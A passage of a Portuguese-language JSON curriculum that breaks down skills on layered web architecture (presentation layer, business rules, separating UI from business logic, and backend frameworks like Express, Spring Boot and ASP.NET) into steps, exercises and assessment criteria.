                              "practicalExample": "Crie uma página de cartão de produto: HTML para estrutura (imagem, título, preço, botão 'Comprar'), CSS para design responsivo (grid layout, hover effects), JS para interatividade (botão adiciona ao carrinho e atualiza contador).",
                              "finalVerifications": [
                                "Lista corretamente HTML, CSS e JS como componentes principais.",
                                "Explica a integração: HTML estrutura + CSS visual + JS dinâmica.",
                                "Identifica exemplos reais como sites responsivos.",
                                "Desenha diagrama da camada de apresentação.",
                                "Cria um exemplo funcional mínimo.",
                                "Discute limitações (ex: sem lógica de negócio)"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação dos componentes (100% corretos).",
                                "Profundidade na explicação de integração (clara e lógica).",
                                "Qualidade do exemplo prático (funcional e bem documentado).",
                                "Completude das verificações (todas atendidas).",
                                "Criatividade nas conexões interdisciplinares.",
                                "Clareza na comunicação (sem jargões desnecessários)"
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Aplicação de princípios visuais via CSS.",
                                "UX/UI: Foco em interatividade e usabilidade com JS.",
                                "Programação Geral: Lógica básica em JS conecta com outras linguagens.",
                                "Acessibilidade: Semântica HTML liga a inclusão digital."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon, onde HTML estrutura produtos, CSS garante design mobile-first e JS gerencia carrinho dinâmico, permitindo interfaces intuitivas e escaláveis para milhões de usuários."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.2",
                            "name": "Descrever o papel da camada de apresentação na separação de responsabilidades",
                            "description": "Explicar como essa camada isola a lógica de interface da lógica de negócios, promovendo manutenibilidade e reutilização de código em arquiteturas em camadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Princípio da Separação de Responsabilidades (SRP)",
                                  "subSteps": [
                                    "Estudar a definição de SRP no manifesto SOLID.",
                                    "Analisar exemplos de código acoplado onde UI e lógica de negócios estão misturadas.",
                                    "Identificar problemas causados pela violação do SRP, como dificuldade de manutenção.",
                                    "Comparar com código separado para visualizar benefícios iniciais.",
                                    "Mapear SRP para arquiteturas em camadas."
                                  ],
                                  "verification": "Explicar SRP em 3 frases próprias e dar um exemplo simples.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Artigo sobre Princípios SOLID (Robert C. Martin)",
                                    "Exemplos de código em GitHub sobre SRP"
                                  ],
                                  "tips": "Use analogias do mundo real, como separar cozinha de sala de jantar em uma casa.",
                                  "learningObjective": "Dominar o conceito fundamental de SRP aplicado a arquiteturas.",
                                  "commonMistakes": "Confundir SRP com divisão de código em funções pequenas demais."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir o Papel da Camada de Apresentação",
                                  "subSteps": [
                                    "Descrever funções principais: renderização de UI, captura de inputs do usuário.",
                                    "Listar componentes típicos: HTML, CSS, JavaScript no frontend.",
                                    "Diferenciar de outras camadas (apresentação vs. negócios vs. dados).",
                                    "Estudar diagramas de arquitetura em camadas destacando a apresentação.",
                                    "Criar um diagrama simples da camada."
                                  ],
                                  "verification": "Desenhar um diagrama mostrando a camada de apresentação isolada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Diagramas de arquitetura MVC/N-tier",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Pense na camada como o 'rosto' da aplicação, sem cérebro próprio.",
                                  "learningObjective": "Identificar precisamente as responsabilidades da camada de apresentação.",
                                  "commonMistakes": "Atribuir lógica de validação de negócios à apresentação."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar o Isolamento entre Interface e Lógica de Negócios",
                                  "subSteps": [
                                    "Demonstrar fluxo de dados: UI captura input → envia para camada de negócios → recebe resposta.",
                                    "Analisar interfaces de comunicação (APIs REST, DTOs).",
                                    "Refatorar código exemplo misturado para separado.",
                                    "Testar cenários onde mudança na UI não afeta negócios.",
                                    "Discutir injeção de dependências para desacoplamento."
                                  ],
                                  "verification": "Refatorar um snippet de código e explicar o isolamento alcançado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Exemplos de código em JavaScript/Node.js ou C#",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Use controllers para mediar comunicação, nunca lógica direta.",
                                  "learningObjective": "Compreender mecanismos de isolamento prático.",
                                  "commonMistakes": "Permitir chamadas diretas da UI para banco de dados."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Benefícios: Manutenibilidade e Reutilização",
                                  "subSteps": [
                                    "Listar cenários de manutenção: alterar UI sem tocar negócios.",
                                    "Explorar reutilização: mesma lógica de negócios em app web e mobile.",
                                    "Calcular métricas qualitativas (tempo de deploy reduzido).",
                                    "Estudar cases reais de refatoração em camadas.",
                                    "Prever escalabilidade futura."
                                  ],
                                  "verification": "Citar 3 benefícios com exemplos concretos de um projeto hipotético.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Case studies de arquitetura em camadas (Microsoft patterns)",
                                    "Vídeos curtos no YouTube sobre N-tier"
                                  ],
                                  "tips": "Quantifique benefícios: 'reduz bugs em 40% ao isolar mudanças'.",
                                  "learningObjective": "Associar SRP à camada para ganhos mensuráveis.",
                                  "commonMistakes": "Ignorar custos iniciais de setup em prol de benefícios de longo prazo."
                                }
                              ],
                              "practicalExample": "Em um sistema de e-commerce, a camada de apresentação (HTML/JS) exibe o carrinho e captura cliques em 'Comprar', enviando dados via API para a camada de negócios que valida estoque e calcula frete, sem que a UI precise conhecer regras de negócio.",
                              "finalVerifications": [
                                "Explicar SRP e seu papel na camada de apresentação.",
                                "Desenhar diagrama de fluxo isolando UI e negócios.",
                                "Refatorar código exemplo demonstrando isolamento.",
                                "Listar 3 benefícios com exemplos reais.",
                                "Identificar violações de SRP em código fornecido.",
                                "Discutir reutilização em múltiplos frontends."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (SRP e isolamento correto).",
                                "Uso de exemplos práticos e diagramas claros.",
                                "Profundidade nos benefícios (manutenibilidade/reutilização).",
                                "Capacidade de refatoração em código.",
                                "Conexão clara com arquitetura em camadas.",
                                "Linguagem técnica apropriada sem jargões desnecessários."
                              ],
                              "crossCurricularConnections": [
                                "Design Patterns: MVC e MVP.",
                                "Programação Orientada a Objetos: Encapsulamento.",
                                "Desenvolvimento Web: Frameworks como React + Express.",
                                "Gerência de Projetos: Manutenibilidade em equipes ágeis.",
                                "Banco de Dados: Separação em camadas N-tier."
                              ],
                              "realWorldApplication": "Em aplicações como Netflix (frontend React isolado de microsserviços backend) ou e-commerces como Amazon, permitindo equipes separadas para UI e lógica, facilitando atualizações rápidas sem downtime e reutilização de APIs em apps mobile."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.3",
                            "name": "Exemplificar a implementação básica da camada de apresentação",
                            "description": "Criar um exemplo simples de uma página web com HTML, CSS e JavaScript, demonstrando como ela se comunica com as camadas inferiores via APIs ou requisições HTTP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar a estrutura HTML básica da página",
                                  "subSteps": [
                                    "Inicie um novo arquivo HTML com a declaração DOCTYPE e tag html.",
                                    "Adicione a tag head com title 'Camada de Apresentação Exemplo' e link para CSS externo.",
                                    "No body, crie um heading h1 'Lista de Usuários'.",
                                    "Adicione um botão id='fetchBtn' com texto 'Carregar Usuários'.",
                                    "Inclua um div id='usersList' vazio para exibir resultados."
                                  ],
                                  "verification": "Abra o arquivo no navegador e confirme que a página exibe o título e o botão sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code ou similar)",
                                    "Navegador web (Chrome ou Firefox)"
                                  ],
                                  "tips": "Use indentação consistente para legibilidade. Valide o HTML em validator.w3.org.",
                                  "learningObjective": "Entender a estrutura semântica básica do HTML para a camada de apresentação.",
                                  "commonMistakes": [
                                    "Esquecer a tag de fechamento",
                                    "Não usar IDs únicos",
                                    "Colocar scripts no head sem defer"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estilizar a página com CSS",
                                  "subSteps": [
                                    "Crie um arquivo CSS externo e linke no HTML.",
                                    "Estilize o body com font-family sans-serif, padding e background-color claro.",
                                    "Centre o h1 e dê cor ao botão com background azul e hover effect.",
                                    "Estilize o div#usersList como uma grid ou flexbox para listar itens.",
                                    "Adicione responsividade com media queries para mobile."
                                  ],
                                  "verification": "Recarregue a página e verifique se os estilos são aplicados corretamente em desktop e mobile.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivo CSS novo",
                                    "Ferramentas de dev do navegador (Inspector)"
                                  ],
                                  "tips": "Use classes para reutilização. Teste hover e focus states.",
                                  "learningObjective": "Aplicar estilos CSS para criar uma interface visual atrativa e responsiva.",
                                  "commonMistakes": [
                                    "Especificidade excessiva com !important",
                                    "Unidades fixas px em vez de rem/em",
                                    "Esquecer de resetar margins/paddings"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar JavaScript para comunicação HTTP",
                                  "subSteps": [
                                    "Adicione um script tag no final do body ou arquivo JS externo.",
                                    "Selecione o botão e div com getElementById.",
                                    "Adicione event listener ao botão para fetch('https://jsonplaceholder.typicode.com/users').",
                                    "No then(), parse JSON e crie elementos li para cada user (nome e email).",
                                    "Append os li ao div#usersList e trate erros com catch()."
                                  ],
                                  "verification": "Clique no botão e confirme que dados de usuários são exibidos sem erros no console.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "API pública JSONPlaceholder",
                                    "Console do navegador para debug"
                                  ],
                                  "tips": "Use async/await em vez de then para legibilidade. Limpe o container antes de adicionar novos itens.",
                                  "learningObjective": "Realizar requisições HTTP assíncronas para simular comunicação com camadas inferiores.",
                                  "commonMistakes": [
                                    "Não tratar CORS (use API pública)",
                                    "Esquecer async no event handler",
                                    "Não limpar lista anterior"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e refinar a integração completa",
                                  "subSteps": [
                                    "Teste a página completa: carregamento, clique, exibição de dados.",
                                    "Adicione loading spinner durante fetch (mostre/esconda div).",
                                    "Implemente tratamento de erro com mensagem amigável.",
                                    "Otimize performance: debounce no botão se necessário.",
                                    "Valide acessibilidade: adicione aria-labels e keyboard navigation."
                                  ],
                                  "verification": "Simule falha de rede (desconecte internet) e confirme mensagem de erro; teste em diferentes browsers.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas dev: Network tab, Lighthouse para audit"
                                  ],
                                  "tips": "Use setTimeout para simular loading. Sempre cheque console para erros.",
                                  "learningObjective": "Integrar HTML, CSS e JS em uma aplicação funcional com comunicação simulada.",
                                  "commonMistakes": [
                                    "Ignorar erros de rede",
                                    "Não testar em mobile",
                                    "Código JS global poluindo window"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma página que exibe uma lista de usuários de uma API REST simulada (JSONPlaceholder). Ao clicar em 'Carregar Usuários', o JS faz fetch, estiliza cards com CSS e popula o HTML dinamicamente, demonstrando fluxo apresentação -> HTTP -> backend simulado.",
                              "finalVerifications": [
                                "Página carrega sem erros visuais ou no console.",
                                "Botão fetch recupera e exibe pelo menos 5 usuários com nome e email.",
                                "Estilos responsivos funcionam em telas <600px.",
                                "Tratamento de erro exibe mensagem ao falhar rede.",
                                "Loading state é visível durante requisição.",
                                "Acessibilidade básica: foco no botão e labels."
                              ],
                              "assessmentCriteria": [
                                "Código HTML semântico e validado.",
                                "CSS modular, responsivo e sem conflitos.",
                                "JS assíncrono correto com fetch e error handling.",
                                "Separação clara de responsabilidades (MVC-like).",
                                "Performance: tempo de load <2s, sem leaks.",
                                "Comentários no código explicando comunicação.",
                                "Testes manuais em 2+ browsers."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolo HTTP e requisições.",
                                "Design de Interfaces: Princípios de UI/UX e responsividade.",
                                "Lógica de Programação: Manipulação de DOM e eventos.",
                                "Banco de Dados: Estrutura JSON como dados de backend."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon, a camada de apresentação (frontend React/Vue) faz requisições HTTP para APIs de backend (Node/PHP) para carregar produtos, carrinho e checkout, garantindo separação de responsabilidades em arquiteturas escaláveis."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.2",
                        "name": "Camada de Lógica de Negócios",
                        "description": "A camada de lógica de negócios contém as regras e processos centrais da aplicação, processando dados recebidos da camada de apresentação e aplicando validações, cálculos e fluxos de decisão antes de interagir com a camada de dados.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.2.1",
                            "name": "Definir regras de negócio e seu posicionamento na camada",
                            "description": "Identificar regras de negócio como validações de entrada, cálculos complexos e fluxos condicionais, explicando por que elas devem residir exclusivamente nessa camada para evitar duplicação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Conceituar Regras de Negócio",
                                  "subSteps": [
                                    "Defina regras de negócio como declarações que governam o comportamento do sistema com base nos requisitos do domínio.",
                                    "Distinga regras de negócio de regras técnicas, focando no 'o quê' em vez do 'como'.",
                                    "Liste exemplos iniciais: validações de dados de entrada, cálculos derivados e fluxos condicionais.",
                                    "Analise o impacto de violar uma regra de negócio no contexto empresarial.",
                                    "Documente uma regra simples em linguagem natural."
                                  ],
                                  "verification": "Crie um glossário com pelo menos 3 definições claras de regras de negócio e valide com um colega ou auto-revisão.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação de modelagem de negócios (ex: BABOK Guide), quadro branco ou ferramenta de notas como Notion.",
                                  "tips": "Use analogias do mundo real, como regras de um jogo de futebol, para tornar conceitos abstratos mais acessíveis.",
                                  "learningObjective": "Compreender a essência e o escopo das regras de negócio no contexto de aplicações.",
                                  "commonMistakes": "Confundir regras de negócio com validações de UI ou constraints de banco de dados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Classificar Tipos de Regras de Negócio",
                                  "subSteps": [
                                    "Identifique validações de entrada: checagem de idade mínima para cadastro.",
                                    "Examine cálculos complexos: cálculo de impostos baseado em faixas de renda.",
                                    "Explore fluxos condicionais: aprovação de pedido apenas se estoque > quantidade solicitada.",
                                    "Classifique regras como estáticas (invariáveis) vs. dinâmicas (dependentes de contexto).",
                                    "Mapeie regras de um caso de uso simples para esses tipos."
                                  ],
                                  "verification": "Produza uma tabela com 5 exemplos de regras classificadas por tipo, com justificativa para cada.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Exemplos de casos de uso de sistemas reais (ex: e-commerce), planilha Excel ou Google Sheets.",
                                  "tips": "Priorize regras que afetam múltiplos processos para destacar sua centralidade.",
                                  "learningObjective": "Capacitar a identificação precisa de regras de negócio em requisitos.",
                                  "commonMistakes": "Sobrecarregar com regras triviais de interface em vez de foco no domínio."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Justificar Posicionamento na Camada de Lógica de Negócios",
                                  "subSteps": [
                                    "Explique a arquitetura em camadas: apresentação, lógica de negócios, dados.",
                                    "Argumente contra duplicação: regras em UI levam a inconsistências em APIs.",
                                    "Discuta centralização: BL garante regras únicas e reutilizáveis.",
                                    "Ilustre violações: cálculo de desconto duplicado em frontend e backend causa erros.",
                                    "Desenhe um diagrama mostrando fluxo de uma regra da UI para BL e dados."
                                  ],
                                  "verification": "Crie um diagrama UML ou fluxograma posicionando 3 regras na BL e valide coesão.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramentas de diagramação (Draw.io, Lucidchart), slides de arquitetura em camadas.",
                                  "tips": "Pense em escalabilidade: como novas regras afetam o sistema se centralizadas.",
                                  "learningObjective": "Entender os princípios de separação de responsabilidades e evitar acoplamento.",
                                  "commonMistakes": "Colocar lógica de negócios na camada de dados, violando abstração."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Regras em um Cenário Prático",
                                  "subSteps": [
                                    "Escolha um domínio: sistema de vendas online.",
                                    "Defina regra: 'Desconto de 10% se compra > R$500 e cliente fiel'.",
                                    "Implemente pseudocódigo na BL: valide entrada, calcule, aplique condicional.",
                                    "Teste cenários: válido, inválido, edge cases.",
                                    "Refatore para evitar duplicação em outros fluxos."
                                  ],
                                  "verification": "Execute testes unitários no pseudocódigo e documente cobertura de 80% dos casos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Editor de código (VS Code), framework de testes (JUnit ou similar para pseudocódigo).",
                                  "tips": "Use TDD (Test-Driven Development) para garantir robustez das regras.",
                                  "learningObjective": "Praticar implementação e verificação de regras na camada correta.",
                                  "commonMistakes": "Implementar regra na camada errada e não detectar em testes."
                                }
                              ],
                              "practicalExample": "Em um e-commerce, a regra 'Aplicar frete grátis se valor total > R$200 e região Brasil' é definida na BL: valida entrada do carrinho, calcula total, verifica região via serviço externo e aplica desconto, evitando duplicação em app mobile e web.",
                              "finalVerifications": [
                                "Lista pelo menos 5 regras de negócio identificadas corretamente de um caso de uso.",
                                "Diagrama posiciona todas regras na BL sem violações de camadas.",
                                "Pseudocódigo implementa fluxos condicionais sem duplicação.",
                                "Testes cobrem edge cases como entradas inválidas.",
                                "Explicação oral justifica centralização para evitar inconsistências.",
                                "Documento resume tipos de regras com exemplos concretos."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições claras e sem confusões com outras camadas (30%).",
                                "Profundidade de classificação: variedade de tipos com exemplos relevantes (25%).",
                                "Justificativa robusta: argumentos contra duplicação com evidências (20%).",
                                "Aplicação prática: código/diagrama funcional e testável (15%).",
                                "Clareza e organização: materiais bem estruturados e profissionais (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Implementação em linguagens como Java/C# com services.",
                                "Banco de Dados: Distinção de constraints DB vs. regras dinâmicas na BL.",
                                "Análise de Requisitos: Elicitação de regras via UML Use Cases.",
                                "Gestão de Projetos: Impacto de regras no backlog e priorização."
                              ],
                              "realWorldApplication": "Em bancos, regras como 'Aprovar empréstimo se score > 700 e renda > 5k' centralizadas na BL evitam fraudes e inconsistências em apps, ATMs e APIs parceiras, garantindo conformidade regulatória."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.2.2",
                            "name": "Diferenciar lógica de apresentação de lógica de negócios",
                            "description": "Comparar exemplos onde interações visuais ficam na apresentação e processamentos lógicos ficam na negócios, destacando benefícios como escalabilidade e testabilidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Lógica de Apresentação e Lógica de Negócios",
                                  "subSteps": [
                                    "Ler definições padrão: Lógica de apresentação gerencia interface visual e interações do usuário (ex: botões, formulários); Lógica de negócios gerencia regras, processos e dados (ex: cálculos, validações de regras).",
                                    "Anotar diferenças chave: Apresentação é volátil e user-facing; Negócios é estável e independente de UI.",
                                    "Criar um diagrama simples separando as camadas em um papel ou ferramenta digital.",
                                    "Pesquisar analogias reais, como 'decoração de prato (apresentação) vs. receita culinária (negócios)'."
                                  ],
                                  "verification": "Escrever definições próprias em 2-3 frases cada e listar 3 diferenças principais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação MVC/MVP (ex: artigos MDN ou Microsoft Docs)",
                                    "Papel/caneta ou ferramenta como Draw.io",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use analogias cotidianas para fixar conceitos; foque em 'quem usa' (usuário vs. sistema).",
                                  "learningObjective": "Definir precisamente lógica de apresentação e negócios, identificando suas responsabilidades distintas.",
                                  "commonMistakes": [
                                    "Confundir formatação visual com processamento de dados",
                                    "Achar que toda validação é negócios (alguma é UI)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Exemplos Práticos de Cada Tipo de Lógica",
                                  "subSteps": [
                                    "Analisar código exemplo de um formulário login: Identificar partes UI (mostrar erro em vermelho) como apresentação.",
                                    "Listar 3 exemplos de lógica de negócios em um app e-commerce: calcular frete, aplicar cupom, verificar estoque.",
                                    "Classificar 5 trechos de código misturados fornecidos em uma lista (ex: validar email formato vs. checar credenciais banco).",
                                    "Discutir com um par ou auto-refletir: 'Por que isso vai em qual camada?'."
                                  ],
                                  "verification": "Criar uma tabela com 4 exemplos: 2 apresentação e 2 negócios, justificando cada classificação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exemplos de código em HTML/JS + backend simulado (ex: GitHub repos MVC)",
                                    "Planilha ou Markdown para tabela"
                                  ],
                                  "tips": "Pergunte: 'Isso muda se trocar o framework frontend?' Se sim, é apresentação.",
                                  "learningObjective": "Reconhecer instâncias reais de cada lógica em código e cenários.",
                                  "commonMistakes": [
                                    "Colocar cálculos de UI (ex: largura responsiva) em negócios",
                                    "Ignorar que APIs são negócios, não apresentação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar as Duas Lógicas e Analisar Benefícios da Separação",
                                  "subSteps": [
                                    "Mapear fluxos: Usuário clica botão (apresentação) → chama regra de desconto (negócios) → retorna dado formatado (apresentação).",
                                    "Listar benefícios: Escalabilidade (trocar UI sem quebrar regras), Testabilidade (unit tests isolados), Manutenibilidade (times separados).",
                                    "Simular refatoração: Pegar código monolítico e separar em camadas.",
                                    "Avaliar cenários: 'O que acontece se misturar? (duplicação, difícil debug)'."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito 3 benefícios com exemplos de problemas sem separação.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Código exemplo monolítico vs. em camadas (ex: snippets JS/Node)",
                                    "Vídeos curtos sobre Clean Architecture (5 min)"
                                  ],
                                  "tips": "Pense em apps reais: Instagram UI muda, mas algoritmo de feed (negócios) persiste.",
                                  "learningObjective": "Contrastar lógicas e justificar separação por benefícios mensuráveis.",
                                  "commonMistakes": [
                                    "Subestimar testabilidade: 'UI tests são caros vs. business unit tests rápidos'",
                                    "Confundir com camadas de dados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar a Diferenciação em um Cenário Simples",
                                  "subSteps": [
                                    "Desenhar arquitetura de um mini-app (ex: calculadora de IMC): UI captura peso/altura, negócios calcula IMC e categoriza, UI exibe gráfico.",
                                    "Implementar protótipo básico em pseudocódigo ou ferramenta low-code.",
                                    "Testar mudando UI (cores, layout) sem alterar negócios.",
                                    "Documentar lições aprendidas sobre escalabilidade."
                                  ],
                                  "verification": "Apresentar o diagrama/protótipo mostrando separação clara e testar uma mudança UI.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramenta como Figma para UI mockup ou CodePen para protótipo",
                                    "Pseudocódigo template"
                                  ],
                                  "tips": "Mantenha negócios 'burro-proof': funcione sem UI (ex: CLI version).",
                                  "learningObjective": "Aplicar diferenciação prática, validando benefícios.",
                                  "commonMistakes": [
                                    "Vazar negócios para UI (ex: cálculo dentro do HTML template)",
                                    "Esquecer independência: negócios deve rodar isolado"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce: Lógica de apresentação formata o preço como 'R$ 99,90' com ícone de moeda e animação no carrinho. Lógica de negócios calcula desconto de 20% para clientes VIP verificando histórico de compras no banco, aplica imposto regional e atualiza estoque – isso permanece igual mesmo se o design mudar para mobile.",
                              "finalVerifications": [
                                "Classificar corretamente 80% de 10 trechos de código como apresentação ou negócios.",
                                "Explicar 3 benefícios da separação com exemplos pessoais.",
                                "Refatorar um código curto monolítico em camadas sem erros lógicos.",
                                "Identificar violações de separação em um diagrama dado.",
                                "Demonstrar teste unitário isolado de uma regra de negócios."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção conceitual (definições corretas >90%).",
                                "Qualidade de exemplos e classificações (relevantes e justificados).",
                                "Profundidade na análise de benefícios (escalabilidade, testabilidade citados com evidências).",
                                "Criatividade e clareza no protótipo ou diagrama aplicado.",
                                "Compreensão de impactos reais (ex: manutenção em times grandes)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Orientada a Objetos (encapsulamento de responsabilidades).",
                                "Design de Sistemas (arquitetura limpa e SOLID principles).",
                                "Banco de Dados (lógica de negócios integra queries e regras).",
                                "Gestão de Projetos (separação facilita ágil e CI/CD).",
                                "Testes de Software (unit vs. E2E)."
                              ],
                              "realWorldApplication": "Em desenvolvimento de apps web escaláveis como e-commerces (Magazine Luiza) ou plataformas SaaS (Netflix), a separação permite equipes frontend focarem em UX sem quebrar regras backend, reduzindo bugs em 40-60%, acelerando deploys e suportando crescimento para milhões de usuários."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.2.3",
                            "name": "Exemplificar tecnologias para a camada de lógica de negócios",
                            "description": "Listar e descrever frameworks como Node.js, Spring Boot ou ASP.NET para implementar serviços que processam requisições HTTP e aplicam lógica de negócios em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o papel da camada de lógica de negócios e identificar tecnologias principais",
                                  "subSteps": [
                                    "Revise o conceito de arquitetura em camadas, focando na camada de lógica de negócios que processa regras de negócio após a camada de apresentação.",
                                    "Pesquise frameworks populares para back-end web: Node.js (com Express), Spring Boot (Java) e ASP.NET Core (C#/.NET).",
                                    "Liste pelo menos 3 tecnologias adicionais opcionais (ex: Django, Laravel) para contexto.",
                                    "Anote definições breves: o que cada framework faz na processamento de HTTP e lógica de negócios.",
                                    "Crie um mapa mental conectando requisições HTTP à aplicação de regras de negócio."
                                  ],
                                  "verification": "Verifique se você tem uma lista de 3 frameworks principais com definições de 1-2 frases cada e um mapa mental salvo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Navegador web, papel/caneta ou ferramenta como Draw.io, documentação oficial: nodejs.org, spring.io, dotnet.microsoft.com",
                                  "tips": "Comece pela documentação oficial para evitar informações desatualizadas de blogs.",
                                  "learningObjective": "Compreender o escopo da camada de lógica de negócios e identificar frameworks chave para implementá-la.",
                                  "commonMistakes": "Confundir camada de lógica com camada de dados (persistência); focar só em front-end."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Node.js/Express para processamento de requisições HTTP",
                                  "subSteps": [
                                    "Instale Node.js e Express via npm (npm init, npm install express).",
                                    "Crie um servidor básico que escuta em uma porta e responde a GET / com JSON.",
                                    "Adicione middleware para processar lógica de negócios, como validar um usuário fictício em POST /login.",
                                    "Teste com Postman ou curl: envie requisição e verifique aplicação de regras (ex: checar senha).",
                                    "Documente o fluxo: HTTP request -> middleware -> lógica -> response."
                                  ],
                                  "verification": "Execute o código e capture screenshot de requisição bem-sucedida e falha intencional.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Node.js instalado, editor de código (VS Code), Postman ou curl, terminal.",
                                  "tips": "Use console.log para debugar o fluxo de execução e entender middlewares.",
                                  "learningObjective": "Implementar e descrever como Node.js/Express lida com HTTP e lógica de negócios de forma assíncrona.",
                                  "commonMistakes": "Ignorar async/await em operações; não tratar erros HTTP adequadamente (ex: status 400)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Spring Boot para serviços Java enterprise",
                                  "subSteps": [
                                    "Instale JDK e Spring Initializr (spring.io/tools) para gerar projeto com Web starter.",
                                    "Crie um Controller REST que mapeia /login POST, injeta Service com lógica de validação de usuário.",
                                    "Implemente @Service com regras de negócio (ex: autenticação simples).",
                                    "Teste com Postman: verifique injeção de dependências e respostas.",
                                    "Descreva anotações chave: @RestController, @PostMapping, @Service."
                                  ],
                                  "verification": "Projeto roda em localhost:8080; teste endpoints com logs de sucesso/falha.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "JDK 17+, Spring Boot Initializr, IntelliJ/VS Code, Postman.",
                                  "tips": "Use @Autowired para injeção; rode com ./mvnw spring-boot:run.",
                                  "learningObjective": "Descrever o modelo MVC do Spring Boot e sua aplicação em lógica de negócios escalável.",
                                  "commonMistakes": "Esquecer configurações de CORS para testes; confundir Controller com Service."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar ASP.NET Core e sintetizar comparações",
                                  "subSteps": [
                                    "Instale .NET SDK e crie projeto webapi via dotnet new webapi.",
                                    "Adicione Controller para /login POST com lógica em um service class (validação de credenciais).",
                                    "Configure middleware pipeline no Program.cs para processar requests.",
                                    "Teste com Postman e compare fluxos com Node.js/Spring (linguagem, performance, ecossistema).",
                                    "Escreva um relatório de 1 página resumindo prós/contras de cada framework."
                                  ],
                                  "verification": "Código funcional testado; relatório salvo com tabela comparativa.",
                                  "estimatedTime": "60 minutos",
                                  "materials": ".NET SDK, VS Code/Visual Studio, Postman.",
                                  "tips": "Use [ApiController] para validação automática; foque em minimal APIs se iniciante.",
                                  "learningObjective": "Comparar frameworks e exemplificar escolhas baseadas em cenários reais.",
                                  "commonMistakes": "Não configurar HTTPS para produção-like; ignorar logging."
                                }
                              ],
                              "practicalExample": "Desenvolva um serviço de e-commerce: endpoint POST /processOrder recebe JSON {productId, quantity}, aplica lógica (verificar estoque, calcular desconto >10 itens, gerar ID pedido) e retorna {orderId, total}. Implemente em Node.js e Spring Boot para comparar.",
                              "finalVerifications": [
                                "Lista precisa de 3+ frameworks com descrições corretas de HTTP e lógica.",
                                "Códigos funcionais testados em pelo menos 2 frameworks.",
                                "Relatório comparativo identifica diferenças chave (ex: tipagem, performance).",
                                "Mapa mental ou diagrama mostra fluxo request-resposta.",
                                "Exemplo prático executado com screenshots.",
                                "Pronto para explicar verbalmente em 5 minutos."
